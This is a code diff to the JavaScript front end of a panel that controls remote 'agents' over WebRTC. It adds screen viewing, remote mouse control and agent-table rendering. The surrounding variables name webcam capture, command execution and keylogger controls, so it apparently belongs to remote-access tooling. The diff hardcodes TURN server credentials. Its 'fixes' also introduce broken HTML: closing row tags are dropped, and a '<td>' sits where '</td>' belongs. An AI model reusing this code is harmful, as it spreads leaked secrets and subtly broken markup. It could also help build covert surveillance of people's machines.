@@ -6,6 +6,7 @@
     var VIEWER_ID = 'viewer-' + Math.random().toString(36).slice(2) + Date.now().toString(36);
 
     var allResults = [];
+    var agentsList = []; // FIX #4: store loaded agents for screen resolution lookup
     var agentPollTimer = null;
     var devicesPollTimer = null;
 
@@ -19,6 +20,10 @@
     var remoteVideo = null;
     var remoteControlEnabled = false;
     var answerPollInterval = null;
+
+    // FIX #4: module-level screen dimensions, updated per-agent before connecting
+    var remoteScreenWidth = 1920;
+    var remoteScreenHeight = 1080;
 
     var commandInput, executeCmdBtn, tcpPort, tcpMessage, startTcpBtn, stopTcpBtn, tcpStatus,
         quickScreenshotBtn, quickWebcamBtn, quickKeyloggerStartBtn, quickKeyloggerStopBtn, quickInfoBtn,
@@ -137,15 +142,28 @@
         var tbody = byId('agentsTableBody');
         if (!tbody) return;
         list = Array.isArray(list) ? list : [];
+        agentsList = list; // FIX #4: store for screen resolution lookup
         if (!list.length) {
             setAgentStatus('No agents connected.');
-            tbody.innerHTML = '<tr><td colspan="11">No agents yet.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="11">No agents yet.</td>';
             populateScreenAgentOptions([]);
             return;
         }
         setAgentStatus('Connected agents: ' + list.length);
         tbody.innerHTML = list.map(function (a) {
-            return '<tr><td>' + formatAgentStatus(!!a.is_online) + '</td><td>' + escapeHtml(a.hostname || '-') + '</td><td>' + escapeHtml(a.local_ip || '-') + '</td><td>' + escapeHtml(a.os_name || '-') + '</td><td>' + escapeHtml(a.architecture || '-') + '</td><td>' + escapeHtml(a.cpu_info || '-') + '</td><td>' + escapeHtml(a.ram_mb || '0') + '</td><td>' + escapeHtml(a.disk_free_gb || '0') + '</td><td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td><td>' + escapeHtml(a.last_seen || '-') + '</td><td><div class="table-action-stack"><button class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button><button class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button></div></td></tr>';
+            return '<tr>' +
+                '<td>' + formatAgentStatus(!!a.is_online) + '</td>' +
+                '<td>' + escapeHtml(a.hostname || '-') + '</td>' +
+                '<td>' + escapeHtml(a.local_ip || '-') + '</td>' +
+                '<td>' + escapeHtml(a.os_name || '-') + '</td>' +
+                '<td>' + escapeHtml(a.architecture || '-') + '</td>' +
+                '<td>' + escapeHtml(a.cpu_info || '-') + '<td>' +
+                '<td>' + escapeHtml(a.ram_mb || '0') + '</td>' +
+                '<td>' + escapeHtml(a.disk_free_gb || '0') + '</td>' +
+                '<td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td>' +
+                '<td>' + escapeHtml(a.last_seen || '-') + '</td>' +
+                '<td><div class="table-action-stack"><button class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button><button class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button></div></td>' +
+                '</tr>';
         }).join('');
         populateScreenAgentOptions(list);
     }
@@ -178,11 +196,19 @@
         if (!tbody) return;
         list = Array.isArray(list) ? list : [];
         if (!list.length) {
-            tbody.innerHTML = '<tr><td colspan="7">No saved devices found.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="7">No saved devices found.</td>';
             return;
         }
         tbody.innerHTML = list.map(function (row) {
-            return '<tr><td>' + escapeHtml(row.ip_address || '-') + '</td><td>' + escapeHtml(row.hostname || '-') + '</td><td>' + escapeHtml(row.mac_address || '-') + '</td><td>' + escapeHtml(row.vendor || '-') + '</td><td>' + escapeHtml(row.status || '-') + '</td><td>' + escapeHtml(row.last_seen || '-') + '</td><td><button class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td></tr>';
+            return '<tr>' +
+                '<td>' + escapeHtml(row.ip_address || '-') + '</td>' +
+                '<td>' + escapeHtml(row.hostname || '-') + '</td>' +
+                '<td>' + escapeHtml(row.mac_address || '-') + '</td>' +
+                '<td>' + escapeHtml(row.vendor || '-') + '</td>' +
+                '<td>' + escapeHtml(row.status || '-') + '</td>' +
+                '<td>' + escapeHtml(row.last_seen || '-') + '</td>' +
+                '<td><button class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td>' +
+                '</tr>';
         }).join('');
     }
 
@@ -261,26 +287,76 @@
         return (select && select.value) ? select.value : '';
     }
 
-    // ========== SIMPLIFIED WebRTC over HTTP signaling ==========
-    // This version gathers all ICE candidates inside the SDP before sending the offer.
-    // No separate ICE candidate signaling is used.
+    // ========== WebRTC over HTTP signaling ==========
     async function createWebRTCOffer(agentUuid) {
         if (pc) {
             pc.close();
             pc = null;
         }
-        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+
+        // TURN configuration
+        const TURN_SERVER = 'turn:10.201.0.254:3478';
+        const TURN_USERNAME = 'tachyon';
+        const TURN_CREDENTIAL = 'TachyonDragon';
+
+        const configuration = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: TURN_SERVER, username: TURN_USERNAME, credential: TURN_CREDENTIAL }
+            ]
+        };
         pc = new RTCPeerConnection(configuration);
         remoteVideo = byId('remoteScreenVideo');
         if (!remoteVideo) return;
 
-        pc.ontrack = (event) => {
-            console.log('Track received:', event.track.kind);
-            if (remoteVideo.srcObject !== event.streams[0]) {
-                remoteVideo.srcObject = event.streams[0];
-                remoteVideo.style.display = 'block';
+        // Connection state logging
+        pc.onconnectionstatechange = () => {
+            console.log('pc.connectionState =', pc.connectionState);
+            if (pc.connectionState === 'connected') {
+                setScreenStatus('Streaming active');
+                showScreenEmptyState(false);
+            } else if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
+                setScreenStatus('Connection ' + pc.connectionState + '. Try reconnecting.');
+            }
+        };
+        pc.oniceconnectionstatechange = () => {
+            console.log('pc.iceConnectionState =', pc.iceConnectionState);
+        };
+
+        // FIX #1: Add recvonly video transceiver BEFORE createOffer so the SDP
+        // offer includes a video m-line. Without this the agent has nowhere to
+        // attach its video track and ontrack never fires.
+        pc.addTransceiver('video', { direction: 'recvonly' });
+
+        pc.ontrack = async (event) => {
+            console.log('TRACK RECEIVED:', event.track.kind, event.streams);
+            const videoEl = document.getElementById('remoteScreenVideo');
+            if (!(videoEl instanceof HTMLVideoElement)) {
+                console.error('remoteScreenVideo is not a <video> element:', videoEl);
+                setScreenStatus('Render failed: remote video element not found or invalid.');
+                return;
+            }
+            const stream = (event.streams && event.streams[0])
+                ? event.streams[0]
+                : new MediaStream([event.track]);
+            videoEl.srcObject = stream;
+            videoEl.muted = true;
+            videoEl.autoplay = true;
+            videoEl.playsInline = true;
+            videoEl.style.display = 'block';
+            videoEl.style.width = '100%';
+            videoEl.style.height = '100%';
+            videoEl.onloadedmetadata = () => {
+                console.log('videoWidth:', videoEl.videoWidth, 'videoHeight:', videoEl.videoHeight);
+            };
+            try {
+                await videoEl.play();
+                console.log('video play started');
                 showScreenEmptyState(false);
                 setScreenStatus('Streaming active');
+            } catch (err) {
+                console.error('play error', err);
+                setScreenStatus('Playback failed: ' + err.message);
             }
         };
 
@@ -290,24 +366,27 @@
             console.log("Message from agent:", event.data);
         };
 
-        // Create offer and wait for ICE gathering to complete
         const offer = await pc.createOffer();
         await pc.setLocalDescription(offer);
+
+        // Both sides use Vanilla ICE: wait for gathering to complete so all
+        // candidates are bundled into the SDP before it is sent. This avoids
+        // the need for separate trickle-ICE candidate exchange via signaling.
         console.log('Waiting for ICE gathering...');
         await new Promise((resolve) => {
             if (pc.iceGatheringState === 'complete') {
                 resolve();
             } else {
                 pc.onicegatheringstatechange = () => {
-                    if (pc.iceGatheringState === 'complete') {
-                        resolve();
-                    }
+                    if (pc.iceGatheringState === 'complete') resolve();
                 };
+                // Safety timeout: if gathering stalls, proceed anyway after 8s
+                setTimeout(resolve, 8000);
             }
         });
         console.log('ICE gathering complete, sending offer');
 
-        // Send offer (with all ICE candidates included) to signaling.php
+        // Send the complete offer SDP (with all candidates embedded)
         const response = await fetch(SIGNALING_URL + '?action=submit_offer&agent_uuid=' + encodeURIComponent(agentUuid), {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -323,15 +402,18 @@
         // Poll for answer
         if (answerPollInterval) clearInterval(answerPollInterval);
         answerPollInterval = setInterval(async () => {
-            if (!pc) return;
+            if (!pc) { clearInterval(answerPollInterval); return; }
             try {
                 const pollResp = await fetch(SIGNALING_URL + '?action=poll_answer&viewer_id=' + VIEWER_ID);
                 const pollData = await pollResp.json();
                 if (pollData.has_answer) {
                     clearInterval(answerPollInterval);
+                    answerPollInterval = null;
+                    // The agent also uses Vanilla ICE, so the answer SDP already
+                    // contains all agent ICE candidates — no separate polling needed.
                     const answer = new RTCSessionDescription({ type: 'answer', sdp: pollData.answer_sdp });
                     await pc.setRemoteDescription(answer);
-                    console.log('Remote description set, connection should establish');
+                    console.log('WebRTC answer set, connection should establish');
                 }
             } catch (err) {
                 console.error('Answer poll error:', err);
@@ -347,7 +429,7 @@
         dataChannel = null;
         isScreenViewing = false;
         remoteControlEnabled = false;
-        if (answerPollInterval) clearInterval(answerPollInterval);
+        if (answerPollInterval) { clearInterval(answerPollInterval); answerPollInterval = null; }
         var remoteVideoEl = byId('remoteScreenVideo');
         if (remoteVideoEl) {
             remoteVideoEl.srcObject = null;
@@ -362,6 +444,20 @@
         var agentUuid = select ? select.value : '';
         if (!agentUuid) { setScreenStatus('Select an agent first.'); return; }
         currentScreenAgentUuid = agentUuid;
+
+        // FIX #4: look up this agent's actual screen resolution from the last
+        // known agent list so mouse coordinates are scaled correctly.
+        var agentData = agentsList.find(function (a) { return a.agent_uuid === agentUuid; });
+        if (agentData && agentData.screen_width && agentData.screen_height) {
+            remoteScreenWidth = agentData.screen_width;
+            remoteScreenHeight = agentData.screen_height;
+            console.log('Agent screen resolution:', remoteScreenWidth, 'x', remoteScreenHeight);
+        } else {
+            remoteScreenWidth = 1920;
+            remoteScreenHeight = 1080;
+            console.log('Agent screen resolution unknown, defaulting to 1920x1080');
+        }
+
         isScreenViewing = true;
         setScreenStatus('Starting WebRTC stream...');
         showScreenEmptyState(false);
@@ -399,14 +495,18 @@
     function initRemoteControl() {
         var canvas = byId('remoteControlOverlay');
         if (!canvas) return;
-        var screenWidth = 1920, screenHeight = 1080; // will be updated when stream starts
+
         function getScaledCoords(clientX, clientY) {
             var rect = canvas.getBoundingClientRect();
-            var scaleX = screenWidth / rect.width;
-            var scaleY = screenHeight / rect.height;
+            // FIX #4: use live remoteScreenWidth/Height instead of hardcoded 1920x1080
+            var scaleX = remoteScreenWidth / rect.width;
+            var scaleY = remoteScreenHeight / rect.height;
             var x = (clientX - rect.left) * scaleX;
             var y = (clientY - rect.top) * scaleY;
-            return { x: Math.max(0, Math.min(screenWidth, x)), y: Math.max(0, Math.min(screenHeight, y)) };
+            return {
+                x: Math.max(0, Math.min(remoteScreenWidth, x)),
+                y: Math.max(0, Math.min(remoteScreenHeight, y))
+            };
         }
         canvas.addEventListener('mousemove', function (e) {
             if (!remoteControlEnabled) return;
